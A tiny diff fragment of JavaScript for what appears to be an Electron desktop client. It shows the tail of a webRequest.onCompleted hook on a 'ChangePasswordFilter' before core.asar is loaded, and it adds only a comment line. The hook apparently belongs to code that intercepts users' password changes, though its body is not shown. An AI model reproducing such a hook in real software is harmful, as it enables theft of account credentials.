@@ -658,4 +658,6 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
     }
 });
 
+//DEFAULT;
+
 module.exports = require('./core.asar')
